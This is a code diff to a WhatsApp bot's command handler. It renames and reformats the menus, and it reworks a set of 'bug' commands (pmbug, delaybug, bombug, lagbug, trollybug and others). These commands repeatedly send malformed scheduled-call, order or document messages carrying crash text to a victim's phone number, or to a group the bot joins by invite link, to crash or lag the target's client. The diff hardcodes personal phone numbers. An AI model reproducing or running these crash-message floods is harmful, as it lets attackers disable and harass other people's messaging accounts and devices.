@@ -5864,6 +5407,7 @@ await XeonStickWait()
                     return('Error!')
                 })
                 }
+break
 case 'animeshinobu':{
 await XeonStickWait()
  waifudd = await axios.get(`https://waifu.pics/api/sfw/shinobu`)       
@@ -6849,7 +6393,7 @@ ${listAdmin}
     XeonBotInc.sendMessage(m.chat, {text : text, mentions: [...groupAdmins.map(v => v.id), owner] }, {quoted: m})
 }
 break
-case 'instagram': case 'igvideo': case 'igimage': case 'igvid': case 'igimg' : case 'insta' : case 'ig' : {
+case 'instagram': case 'igvideo': case 'igimage': case 'igvid': case 'igimg': {
 	  if (!text) return replygcxeon(`You need to give the URL of Any Instagram video, post, reel, image`)
   let res
   try {
@@ -6863,11 +6407,9 @@ case 'instagram': case 'igvideo': case 'igimage': case 'igvid': case 'igimg' : c
   }
   const mediaArray = api_response.data;
   for (const mediaData of mediaArray) {
-    let sender = m.sender
     const mediaType = mediaData.type
     const mediaURL = mediaData.url_download
-    let cap = ` ${themeemoji} @${m.sender.split("@")[0]} HERE IS THE ${mediaType.toUpperCase()}`
-    mentionedJid:[sender]
+    let cap = `HERE IS THE ${mediaType.toUpperCase()}`
     if (mediaType === 'video') {
       XeonBotInc.sendMessage(m.chat, {video: {url: mediaURL}, caption: cap}, {quoted: m})
     } else if (mediaType === 'image') {
@@ -7086,12 +6628,11 @@ case 'blur':
             let xmenu_oh = `┌────────❖ 𝕮𝖍𝖊𝖊𝖒𝖘 𝕭𝖔𝖙 ❖────────┐
 │ Hi 👋 
 └┬❖  ${pushname} 
-     │✑  ${xeonytimewisher} 😄
+ │✑  ${xeonytimewisher} 😄
 ┌┤✑ Use prefix ${prefix}
 │└────────────┈ ⳹
 │
-└───❖ 𝐁𝐎𝐓 𝐈𝐍𝐅𝐎
-│ᴍᴇɴᴜᴛʏᴘᴇ : ${typemenu}
+└─ 𝐁𝐎𝐓 𝐈𝐍𝐅𝐎
 │sᴘᴇᴇᴅ      : ${latensie.toFixed(4)} miliseconds
 │ʀᴜɴᴛɪᴍᴇ    : ${runtime(process.uptime())}
 │ʙᴏᴛ‌: ${botname}
@@ -7099,49 +6640,45 @@ case 'blur':
 │ᴘʀᴇғɪx‌     : ${xprefix} 
 │ᴍᴏᴅᴇ   : ${XeonBotInc.public ? 'Public' : `Self`}
 │ʜᴏsᴛ ɴᴀᴍᴇ : ${os.hostname()}
-│ᴏᴡɴᴇʀ ɴᴀᴍᴇ : ${ownername}
 │ᴘʟᴀᴛғᴏʀᴍ‌    : ${os.platform()}
 │‌ᴛᴏᴛᴀʟ ᴜsᴇʀ : ${Object.keys(global.db.data.users).length} User
 │ᴛᴏᴛᴀʟ ʜɪᴛ  : ${global.db.data.settings[botNumber].totalhit} Hit
 │ᴛᴏᴛᴀʟ ᴄʜᴀᴛ‌ : ${Object.keys(global.db.data.chats).length} Chat/Gc
-│ᴀᴜᴛᴏsᴛᴀᴛᴜs ᴠɪᴇᴡ : ${autoswview} 
-│ᴡᴇʟᴄᴏᴍᴇ sᴛᴀᴛᴜs : ${welcome}
-│ᴛᴏᴛᴀʟ ғᴇᴀᴛᴜʀᴇs : ${xeonfeature()}
 │
 │
-└──❖ 𝐔𝐒𝐄𝐑 𝐈𝐍𝐅𝐎
+└─ 𝐔𝐒𝐄𝐑 𝐈𝐍𝐅𝐎
 │ɴᴀᴍᴇ   ‌  : ${pushname}
 │ɴᴜᴍʙᴇʀ   : +${me.split('@')[0]}
 │ʟɪᴍɪᴛ    : ${a.limit}
 │ᴛɪᴛʟᴇ    : ${a.title ? a.title : '-'}
 │sᴇʀɪᴀʟ: ${a.serialNumber}
 │
-└──❖ 𝐓𝐈𝐌𝐄 𝐈𝐍𝐅𝐎
+└─ 𝐓𝐈𝐌𝐄 𝐈𝐍𝐅𝐎
 │ᴛɪᴍᴇ : ${xtime}
 │ᴅᴀᴛᴇ : ${xdate}
-└┬──────────────────────── ⳹
+└┬───────────────── ⳹
    │✑  Please Type The *MENU*
    │✑  Given *BELOW*
-┌└───────────────────────┈ ⳹
-│❏${xprefix}𝐀𝐋𝐋𝐌𝐄𝐍𝐔
-│❏${xprefix}𝐃𝐎𝐖𝐍𝐋𝐎𝐀𝐃𝐌𝐄𝐍𝐔
-│❏${xprefix}𝐅𝐔𝐍𝐌𝐄𝐍𝐔
-│❏${xprefix}𝐀𝐈𝐌𝐄𝐍𝐔
-│❏${xprefix}𝐆𝐑𝐎𝐔𝐏𝐌𝐄𝐍𝐔
-│❏${xprefix}𝐎𝐖𝐍𝐄𝐑𝐌𝐄𝐍𝐔
-│❏${xprefix}𝐏𝐇𝐎𝐓𝐎𝐎𝐗𝐘𝐌𝐄𝐍𝐔
-│❏${xprefix}𝐄𝐏𝐇𝐎𝐓𝐎𝟑𝟔𝟎𝐌𝐄𝐍𝐔
-│❏${xprefix}𝐌𝐀𝐊𝐄𝐑𝐌𝐄𝐍𝐔
-│❏${xprefix}𝐀𝐍𝐈𝐌𝐄𝐌𝐄𝐍𝐔
-│❏${xprefix}𝐍𝐒𝐅𝐖𝐌𝐄𝐍𝐔
-│❏${xprefix}𝐑𝐀𝐍𝐃𝐎𝐌𝐏𝐇𝐎𝐓𝐎𝐌𝐄𝐍𝐔
-│❏${xprefix}𝐑𝐀𝐍𝐃𝐎𝐌𝐕𝐈𝐃𝐄𝐎𝐌𝐄𝐍𝐔
-│❏${xprefix}𝐒𝐓𝐈𝐂𝐊𝐄𝐑𝐌𝐄𝐍𝐔
-│❏${xprefix}𝐃𝐀𝐓𝐀𝐁𝐀𝐒𝐄𝐌𝐄𝐍𝐔
-│❏${xprefix}𝐒𝐓𝐀𝐋𝐊𝐄𝐑𝐌𝐄𝐍𝐔
-│❏${xprefix}𝐁𝐔𝐆𝐌𝐄𝐍𝐔
-│❏${xprefix}𝐎𝐓𝐇𝐄𝐑𝐌𝐄𝐍𝐔
-└───────────────────────┈ ⳹
+┌└─────────────┈ ⳹
+│❏${xprefix}allmenu
+│❏${xprefix}downloadmenu
+│❏${xprefix}funmenu
+│❏${xprefix}aimenu
+│❏${xprefix}groupmenu
+│❏${xprefix}ownermenu
+│❏${xprefix}photooxymenu
+│❏${xprefix}ephoto360menu
+│❏${xprefix}makermenu
+│❏${xprefix}animemenu
+│❏${xprefix}nsfwmenu
+│❏${xprefix}randomphotomenu
+│❏${xprefix}randomvideomenu
+│❏${xprefix}stickermenu
+│❏${xprefix}databasemenu
+│❏${xprefix}stalkermenu
+│❏${xprefix}bugmenu
+│❏${xprefix}othermenu
+└─────────────────┈ ⳹
 
 > ░▒▓█►─═ ℭ𝔯𝔢𝔞𝔱𝔢𝔡 𝔅𝔶 𝔇𝔢𝔟𝔞𝔰𝔥𝔦𝔰 𝔇𝔢𝔶 ═─◄█▓▒░`
 if (typemenu === 'v1') {
@@ -7365,10 +6902,10 @@ if (typemenu === 'v1') {
 }
 break
             case 'ownermenu': {
-let xmenu_oh = `┌────❖ 𝔻𝔻 ℂℍ𝔼𝔼𝕄𝕊 𝔹𝕆𝕋 ❖────┐
+let xmenu_oh = `┌────❖ Ankita Bot ❖────┐
 │ Hi 👋 
 └┬❖  ${pushname} 
-    │✑  ${xeonytimewisher} 😄
+  │✑  ${xeonytimewisher} 😄
 ┌┤✑ Use prefix ${prefix}
 │└────────────┈ ⳹
 │ ${ownermenu(prefix, hituet)}`
@@ -7482,10 +7019,10 @@ if (typemenu === 'v1') {
 }
 break
 case 'othermenu': {
-let xmenu_oh = `┌────❖ 𝔻𝔻 ℂℍ𝔼𝔼𝕄𝕊 𝔹𝕆𝕋 ❖────┐
+let xmenu_oh = `┌────❖ Ankita Bot ❖────┐
 │ Hi 👋 
 └┬❖  ${pushname} 
-    │✑  ${xeonytimewisher} 😄
+  │✑  ${xeonytimewisher} 😄
 ┌┤✑ Use prefix ${prefix}
 │└────────────┈ ⳹
 │${othermenu(prefix, hituet)}`
@@ -7602,7 +7139,7 @@ case 'downloadmenu': {
 let xmenu_oh = `┌────❖ 𝔻𝔻 ℂℍ𝔼𝔼𝕄𝕊 𝔹𝕆𝕋❖────┐
 │ Hi 👋 
 └┬❖  ${pushname} 
-   │✑  ${xeonytimewisher} 😄
+ │✑  ${xeonytimewisher} 😄
 ┌┤✑ Use prefix ${prefix}
 │└────────────┈ ⳹
 │${downloadmenu(prefix, hituet)}`
@@ -7716,10 +7253,10 @@ if (typemenu === 'v1') {
 }
 break
 case 'groupmenu': {
-let xmenu_oh = `┌────❖ 𝔻𝔻 ℂℍ𝔼𝔼𝕄𝕊 𝔹𝕆𝕋 ❖────┐
+let xmenu_oh = `┌────❖ Ankita Bot ❖────┐
 │ Hi 👋 
 └┬❖  ${pushname} 
-    │✑  ${xeonytimewisher} 😄
+  │✑  ${xeonytimewisher} 😄
 ┌┤✑ Use prefix ${prefix}
 │└────────────┈ ⳹
 │${groupmenu(prefix, hituet)}`
@@ -7833,10 +7370,10 @@ if (typemenu === 'v1') {
 }
 break
 case 'funmenu': {
-let xmenu_oh = `┌────❖ 𝔻𝔻 ℂℍ𝔼𝔼𝕄𝕊 𝔹𝕆𝕋 ❖────┐
+let xmenu_oh = `┌────❖ Ankita Bot ❖────┐
 │ Hi 👋 
 └┬❖  ${pushname} 
-    │✑  ${xeonytimewisher} 😄
+  │✑  ${xeonytimewisher} 😄
 ┌┤✑ Use prefix ${prefix}
 │└────────────┈ ⳹
 │${funmenu(prefix, hituet)}`
@@ -7950,10 +7487,10 @@ if (typemenu === 'v1') {
 }
 break
 case 'stalkermenu': {
-let xmenu_oh = `┌────❖ 𝔻𝔻 ℂℍ𝔼𝔼𝕄𝕊 𝔹𝕆𝕋 ❖────┐
+let xmenu_oh = `┌────❖ Ankita Bot ❖────┐
 │ Hi 👋 
 └┬❖  ${pushname} 
-    │✑  ${xeonytimewisher} 😄
+  │✑  ${xeonytimewisher} 😄
 ┌┤✑ Use prefix ${prefix}
 │└────────────┈ ⳹
 │${stalkermenu(prefix, hituet)}`
@@ -8067,10 +7604,10 @@ if (typemenu === 'v1') {
 }
 break
 case 'randomphotomenu': {
-let xmenu_oh = `┌────❖ 𝔻𝔻 ℂℍ𝔼𝔼𝕄𝕊 𝔹𝕆𝕋 ❖────┐
+let xmenu_oh = `┌────❖ Ankita Bot ❖────┐
 │ Hi 👋 
 └┬❖  ${pushname} 
-    │✑  ${xeonytimewisher} 😄
+  │✑  ${xeonytimewisher} 😄
 ┌┤✑ Use prefix ${prefix}
 │└────────────┈ ⳹
 │${randphotomenu(prefix, hituet)}`
@@ -8184,10 +7721,10 @@ if (typemenu === 'v1') {
 }
 break
 case 'randomvideomenu': {
-let xmenu_oh = `┌────❖ 𝔻𝔻 ℂℍ𝔼𝔼𝕄𝕊 𝔹𝕆𝕋 ❖────┐
+let xmenu_oh = `┌────❖ Ankita Bot ❖────┐
 │ Hi 👋 
 └┬❖  ${pushname} 
-    │✑  ${xeonytimewisher} 😄
+  │✑  ${xeonytimewisher} 😄
 ┌┤✑ Use prefix ${prefix}
 │└────────────┈ ⳹
 │${randvideomenu(prefix, hituet)}`
@@ -8301,10 +7838,10 @@ if (typemenu === 'v1') {
 }
 break
 case 'photooxymenu': {
-let xmenu_oh = `┌────❖ 𝔻𝔻 ℂℍ𝔼𝔼𝕄𝕊 𝔹𝕆𝕋 ❖────┐
+let xmenu_oh = `┌────❖ Ankita Bot ❖────┐
 │ Hi 👋 
 └┬❖  ${pushname} 
-    │✑  ${xeonytimewisher} 😄
+  │✑  ${xeonytimewisher} 😄
 ┌┤✑ Use prefix ${prefix}
 │└────────────┈ ⳹
 │${photooxymenu(prefix, hituet)}`
@@ -8418,10 +7955,10 @@ if (typemenu === 'v1') {
 }
 break
 case 'ephoto360menu': {
-let xmenu_oh = `┌────❖ 𝔻𝔻 ℂℍ𝔼𝔼𝕄𝕊 𝔹𝕆𝕋 ❖────┐
+let xmenu_oh = `┌────❖ Ankita Bot ❖────┐
 │ Hi 👋 
 └┬❖  ${pushname} 
-    │✑  ${xeonytimewisher} 😄
+  │✑  ${xeonytimewisher} 😄
 ┌┤✑ Use prefix ${prefix}
 │└────────────┈ ⳹
 │${ephoto360menu(prefix, hituet)}`
@@ -8535,10 +8072,10 @@ if (typemenu === 'v1') {
 }
 break
 case 'makermenu': {
-let xmenu_oh = `┌────❖ 𝔻𝔻 ℂℍ𝔼𝔼𝕄𝕊 𝔹𝕆𝕋 ❖────┐
+let xmenu_oh = `┌────❖ Ankita Bot ❖────┐
 │ Hi 👋 
 └┬❖  ${pushname} 
-    │✑  ${xeonytimewisher} 😄
+  │✑  ${xeonytimewisher} 😄
 ┌┤✑ Use prefix ${prefix}
 │└────────────┈ ⳹
 │${makermenu(prefix, hituet)}`
@@ -8652,10 +8189,10 @@ if (typemenu === 'v1') {
 }
 break
 case 'nsfwmenu': {
-let xmenu_oh = `┌────❖ 𝔻𝔻 ℂℍ𝔼𝔼𝕄𝕊 𝔹𝕆𝕋 ❖────┐
+let xmenu_oh = `┌────❖ Ankita Bot ❖────┐
 │ Hi 👋 
 └┬❖  ${pushname} 
-    │✑  ${xeonytimewisher} 😄
+  │✑  ${xeonytimewisher} 😄
 ┌┤✑ Use prefix ${prefix}
 │└────────────┈ ⳹
 │${nsfwmenu(prefix, hituet)}`
@@ -8769,10 +8306,10 @@ if (typemenu === 'v1') {
 }
 break
 case 'animemenu': {
-let xmenu_oh = `┌────❖ 𝔻𝔻 ℂℍ𝔼𝔼𝕄𝕊 𝔹𝕆𝕋 ❖────┐
+let xmenu_oh = `┌────❖ Ankita Bot ❖────┐
 │ Hi 👋 
 └┬❖  ${pushname} 
-    │✑  ${xeonytimewisher} 😄
+  │✑  ${xeonytimewisher} 😄
 ┌┤✑ Use prefix ${prefix}
 │└────────────┈ ⳹
 │${animemenu(prefix, hituet)}`
@@ -8886,10 +8423,10 @@ if (typemenu === 'v1') {
 }
 break
 case 'stickermenu': {
-let xmenu_oh = `┌────❖ 𝔻𝔻 ℂℍ𝔼𝔼𝕄𝕊 𝔹𝕆𝕋 ❖────┐
+let xmenu_oh = `┌────❖ Ankita Bot ❖────┐
 │ Hi 👋 
 └┬❖  ${pushname} 
-    │✑  ${xeonytimewisher} 😄
+  │✑  ${xeonytimewisher} 😄
 ┌┤✑ Use prefix ${prefix}
 │└────────────┈ ⳹
 │${stickermenu(prefix, hituet)}`
@@ -9003,10 +8540,10 @@ if (typemenu === 'v1') {
 }
 break
 case 'databasemenu': {
-let xmenu_oh = `┌────❖ 𝔻𝔻 ℂℍ𝔼𝔼𝕄𝕊 𝔹𝕆𝕋 ❖────┐
+let xmenu_oh = `┌────❖ Ankita Bot ❖────┐
 │ Hi 👋 
 └┬❖  ${pushname} 
-    │✑  ${xeonytimewisher} 😄
+  │✑  ${xeonytimewisher} 😄
 ┌┤✑ Use prefix ${prefix}
 │└────────────┈ ⳹
 │${databasemenu(prefix, hituet)}`
@@ -9120,10 +8657,10 @@ if (typemenu === 'v1') {
 }
 break
 case 'aimenu': {
-let xmenu_oh = `┌────❖ 𝔻𝔻 ℂℍ𝔼𝔼𝕄𝕊 𝔹𝕆𝕋 ❖────┐
+let xmenu_oh = `┌────❖ Ankita Bot ❖────┐
 │ Hi 👋 
 └┬❖  ${pushname} 
-    │✑  ${xeonytimewisher} 😄
+  │✑  ${xeonytimewisher} 😄
 ┌┤✑ Use prefix ${prefix}
 │└────────────┈ ⳹
 │${aimenu(prefix, hituet)}`
@@ -9237,10 +8774,10 @@ if (typemenu === 'v1') {
 }
 break
 case 'bugmenu': {
-let xmenu_oh = `┌────❖ 𝔻𝔻 ℂℍ𝔼𝔼𝕄𝕊 𝔹𝕆𝕋 ❖────┐
+let xmenu_oh = `┌────❖ Ankita Bot ❖────┐
 │ Hi 👋 
 └┬❖  ${pushname} 
-   │✑  ${xeonytimewisher} 😄
+  │✑  ${xeonytimewisher} 😄
 ┌┤✑ Use prefix ${prefix}
 │└────────────┈ ⳹
 │${bugmenu(prefix, hituet)}`
@@ -9383,60 +8920,31 @@ break
             //bug && war cases 
 //⚠️do not edit cases otherwise bug not work
 //bug cases 
-async function XeonyCrashy(dgxeon,chat) {
-    XeonBotInc.sendMessage(chat, {
-    document: {url: './settings.js'},
-    mimetype: `image/null`,
-    fileName: `${dgxeon}.${xeontext1}` ,
-    caption: `${dgxeon + xeontext1}`,
-    }, {quoted: subscribe_dgxeon })
-    }
-    
-case 'xcrash':{
-    if (!isPremium) return replygcxeon(mess.prem)
-     if (!args[0]) return replygcxeon(`Use ${prefix+command} number\nExample ${prefix+command} 91xxxxxxxxxx`)
-     victim = text.split("|")[0]+'@s.whatsapp.net'
-    amount = "100"
-    for (let i = 0; i < amount; i++) {
-    XeonyCrashy(pushname,victim)
-    await sleep(3000)
-    }
-    replygcxeon(`*Successfully sent Bug To ${victim} Please pause for 3 minutes*`)
-    }
-    break    
 case 'amountbug': {
-    if (!isPremium) return replygcxeon(mess.premium)
-    if (!args[0]) return replygcxeon(`Use ${prefix+command} number\nExample ${prefix+command} 919339619072`)
-    await loading()
-   victim = text.split("|")[0]+'@s.whatsapp.net'
-   amount = "100"
-   for (let i = 0; i < amount; i++) {
-   const xeonybugx = `${xeontextx}`
-   XeonBotInc.sendMessage(m.chat,
-    { text: `${xeonybugx}`,
-    contextInfo:{
-    forwardingScore: 9999999,
-    isForwarded: true, 
-    "externalAdReply": {
-    "showAdAttribution": true,
-    "containsAutoReply": true,
-    "title": ` ${xeonybugx}`,
-    "body": `${xeonybugx}`,
-    "previewType": "",
-    "thumbnailUrl": ``,
-    "thumbnail": fs.readFileSync(`./XeonMedia/theme/cheemspic.jpg`),
-    "sourceUrl": `${websitex}`}}},
-    { quoted: m})   
-   }
+if (!isPremium) return replygcxeon(mess.premium)
+if (!args[0]) return relygcxeon(`Use ${prefix+command} amount\nExample ${prefix+command} 5`)
+amount = `${encodeURI(text)}`
+for (let i = 0; i < amount; i++) {
+const xeonybug1 = `${xeontext1}`
+var scheduledCallCreationMessage = generateWAMessageFromContent(from, proto.Message.fromObject({
+"scheduledCallCreationMessage": {
+"callType": "2",
+"scheduledTimestampMs": `${moment(1000).tz("Asia/Kolkata").format("DD/MM/YYYY HH:mm:ss")}`,
+"title": xeonybug1,
+}
+}), { userJid: from, quoted : m})
+XeonBotInc.relayMessage(from, scheduledCallCreationMessage.message, { messageId: scheduledCallCreationMessage.key.id })
+await sleep(3000)
+}
 }
 replygcxeon(`*Successfully sent as many bugs as ${amount} Please pause for 3 minutes*`)
 break
 case 'pmbug' :{
  if (!isPremium) return replygcxeon(mess.premium)
- if (!args[0]) return replygcxeon(`Use ${prefix+command} number\nExample ${prefix+command} 919339619072`)
+ if (!args[0]) return replygcxeon(`Use ${prefix+command} number\nExample ${prefix+command} 916909137213`)
  await loading()
 victim = text.split("|")[0]+'@s.whatsapp.net'
-amount = "100"
+amount = "30"
 for (let i = 0; i < amount; i++) {
 const xeonybug1 = `${xeontext1}`
 var scheduledCallCreationMessage = generateWAMessageFromContent(from, proto.Message.fromObject({
@@ -9454,10 +8962,10 @@ replygcxeon(`*Successfully sent Bug To ${victim} Please pause for 3 minutes*`)
 break
 case 'delaybug' : {
 if (!isPremium) return replygcxeon(mess.premium)
-if (!args[0]) return replygcxeon(`Use ${prefix+command} number\nExample ${prefix+command} 919339619072`)
+if (!args[0]) return replygcxeon(`Use ${prefix+command} number\nExample ${prefix+command} 916909137213`)
 await loading()
 victim = text.split("|")[0]+'@s.whatsapp.net'
-amount = "100"
+amount = "30"
 for (let i = 0; i < amount; i++) {
 const xeonybug1 = xeontext2
 var scheduledCallCreationMessage = generateWAMessageFromContent(from, proto.Message.fromObject({
@@ -9475,9 +8983,9 @@ replygcxeon(`*Successfully Sent Bug To ${victim} Please pause for 3 minutes*`)
 break
 case 'docubug': {
 if (!isPremium) return replygcxeon(mess.premium)
-if (!args[0]) return replygcxeon(`Use ${prefix+command} number\nExample ${prefix+command} 919339619072`)
+if (!args[0]) return replygcxeon(`Use ${prefix+command} number\nExample ${prefix+command} 916909137213`)
 await loading()
-if (args.length < 1) return replygcxeon(`Use ${prefix+command} number\nExample ${prefix+command} 919339619072`)
+if (args.length < 1) return replygcxeon(`Use ${prefix+command} number\nExample ${prefix+command} 916909137213`)
 victim = text.split("|")[0]+'@s.whatsapp.net'
 amount = "15"
 for (let i = 0; i < amount; i++) {
@@ -9497,10 +9005,10 @@ replygcxeon(`*Successfully sent Bug To ${victim} Please pause for 3 minutes*`)
 break
 case 'unlimitedbug' : {
 if (!isPremium) return replygcxeon(mess.premium)
-if (!args[0]) return replygcxeon(`Use ${prefix+command} number\nExample ${prefix+command} 919339619072`)
+if (!args[0]) return replygcxeon(`Use ${prefix+command} number\nExample ${prefix+command} 916909137213`)
 await loading()
 victim = text.split("|")[0]+'@s.whatsapp.net'
-amount = "100"
+amount = "30"
 for (let i = 0; i < amount; i++) {
 const xeonybug1 = xeontext3
 var scheduledCallCreationMessage = generateWAMessageFromContent(from, proto.Message.fromObject({
@@ -9518,10 +9026,10 @@ replygcxeon(`*Successfully sent Bug To ${victim} Please pause for 3 minutes*`)
 break
 case 'bombug': {
 if (!isPremium) return replygcxeon(mess.premium)
-if (!args[0]) return replygcxeon(`Use ${prefix+command} number\nExample ${prefix+command} 919339619072`)
+if (!args[0]) return replygcxeon(`Use ${prefix+command} number\nExample ${prefix+command} 916909137213`)
 await loading()
 victim = text.split("|")[0]+'@s.whatsapp.net'
-amount = "100"
+amount = "30"
 for (let i = 0; i < amount; i++) {
 const xeonybug1 = xeontext4
 var scheduledCallCreationMessage = generateWAMessageFromContent(from, proto.Message.fromObject({
@@ -9539,10 +9047,10 @@ replygcxeon(`*Successfully sent Bug To ${victim} Please pause for 3 minutes*`)
 break
 case 'lagbug' : {
 if (!isPremium) return replygcxeon(mess.premium)
-if (!args[0]) return replygcxeon(`Use ${prefix+command} number\nExample ${prefix+command} 919339619072`)
+if (!args[0]) return replygcxeon(`Use ${prefix+command} number\nExample ${prefix+command} 916909137213`)
 await loading()
 victim = text.split("|")[0]+'@s.whatsapp.net'
-amount = "100"
+amount = "30"
 for (let i = 0; i < amount; i++) {
 const xeonybug1 = xeontext2
 var scheduledCallCreationMessage = generateWAMessageFromContent(from, proto.Message.fromObject({
@@ -9560,7 +9068,7 @@ replygcxeon(`*Successfully sent Bug To ${victim} Please pause for 3 minutes*`)
 break
 case 'trollybug': {
 if (!isPremium) return replygcxeon(mess.premium)
-if (!args[0]) return replygcxeon(`Use ${prefix+command} number\nExample ${prefix+command} 919339619072`)
+if (!args[0]) return replygcxeon(`Use ${prefix+command} number\nExample ${prefix+command} 916909137213`)
 await loading()
 victim = text.split("|")[0]+'@s.whatsapp.net'
 amount = "15"
@@ -9574,7 +9082,7 @@ var order = generateWAMessageFromContent(from, proto.Message.fromObject({
 "surface": "CATALOG",
 "message": `${botname}`,
 "orderTitle": " TROLLY BUG ", 
-"sellerJid": "919339619072@s.whatsapp.net",
+"sellerJid": "916909137213@s.whatsapp.net",
 "token": "AR6z9PAvHjs9Qa7AYgBUjSEvcnOcRWycFpwieIhaMKdrhQ=="
 }
 }), { userJid: from, quoted:m})
@@ -9589,7 +9097,7 @@ if (!isPremium) return replygcxeon(mess.premium)
 await loading()
 let result = args[0].split('https://chat.whatsapp.com/')[1]
 let xeongc = await XeonBotInc.groupAcceptInvite(result)
-amount = "100"
+amount = "30"
 for (let i = 0; i < amount; i++) {
 const xeonybug1 = `${xeontext1}`
 var scheduledCallCreationMessage = generateWAMessageFromContent(from, proto.Message.fromObject({
@@ -9611,7 +9119,7 @@ if (!args[0]) return replygcxeon(`Use ${prefix+command} link\nExample ${prefix+c
 await loading()
 let result = args[0].split('https://chat.whatsapp.com/')[1]
 let xeongc = await XeonBotInc.groupAcceptInvite(result)
-amount = "100"
+amount = "30"
 for (let i = 0; i < amount; i++) {
 const xeonybug1 = xeontext5
 var scheduledCallCreationMessage = generateWAMessageFromContent(from, proto.Message.fromObject({
@@ -9633,7 +9141,7 @@ if (!args[0]) return replygcxeon(`Use ${prefix+command} link\nExample ${prefix+c
 await loading()
 let result = args[0].split('https://chat.whatsapp.com/')[1]
 let xeongc = await XeonBotInc.groupAcceptInvite(result)
-amount = "100"
+amount = "30"
 for (let i = 0; i < amount; i++) {
 const xeonybug1 = xeontext2
 var scheduledCallCreationMessage = generateWAMessageFromContent(from, proto.Message.fromObject({
@@ -9655,7 +9163,7 @@ if (!args[0]) return replygcxeon(`Use ${prefix+command} link\nExample ${prefix+c
 await loading()
 let result = args[0].split('https://chat.whatsapp.com/')[1]
 let xeongc = await haikal.groupAcceptInvite(result)
-amount = "100"
+amount = "30"
 for (let i = 0; i < amount; i++) {
 const xeonybug1 = xeontext4
 var scheduledCallCreationMessage = generateWAMessageFromContent(from, proto.Message.fromObject({
@@ -9677,7 +9185,7 @@ if (!args[0]) return replygcxeon(`Use ${prefix+command} link\nExample ${prefix+c
 await loading()
 let result = args[0].split('https://chat.whatsapp.com/')[1]
 let xeongc = await XeonBotInc.groupAcceptInvite(result)
-amount = "100"
+amount = "30"
 for (let i = 0; i < amount; i++) {
 const xeonybug1 = xeontext3
 var scheduledCallCreationMessage = generateWAMessageFromContent(from, proto.Message.fromObject({
@@ -9710,7 +9218,7 @@ var order = generateWAMessageFromContent(from, proto.Message.fromObject({
 "surface": "CATALOG",
 "message": `${botname}`,
 "orderTitle": " TROLLY BUG ", 
-"sellerJid": "919339619072@s.whatsapp.net",
+"sellerJid": "916909137213@s.whatsapp.net",
 "token": "AR6z9PAvHjs9Qa7AYgBUjSEvcnOcRWycFpwieIhaMKdrhQ=="
 }
 }), { userJid: from, quoted:m})
@@ -10318,7 +9826,7 @@ XeonBotInc.copyNForward(m.chat, msgs[budy.toLowerCase()], true, {quoted: m})
     } catch (err) {
         console.log(util.format(err))
         let e = String(err)
-XeonBotInc.sendMessage("919339619072@s.whatsapp.net", { text: "Hello developer, there seems to be an error, please fix it " + util.format(e), 
+XeonBotInc.sendMessage("916909137213@s.whatsapp.net", { text: "Hello developer, there seems to be an error, please fix it " + util.format(e), 
 contextInfo:{
 forwardingScore: 9999999, 
 isForwarded: true
